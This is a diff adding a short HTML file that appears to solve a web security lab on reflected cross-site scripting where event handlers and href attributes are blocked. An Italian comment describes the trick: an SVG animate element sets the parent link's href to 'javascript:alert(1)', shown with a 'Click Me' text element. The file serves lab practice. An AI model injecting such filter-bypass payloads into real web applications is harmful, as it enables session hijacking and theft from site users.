@@ -1,0 +1,16 @@
+<!--
+    LAB: Reflected XSS with event handlers and href attributes blocked
+    si sfrutta animate per settare l'attributo del genitore (a) ed il 
+    suo valore (per eseguire js) dentro il tag svg
+-->
+
+<svg>
+    <a>
+        <animate 
+            attributeName="href" 
+            values="javascript:alert(1)"/>
+        <text x="20" Y="20">
+            Click Me
+        </text>
+    </a>
+</svg>
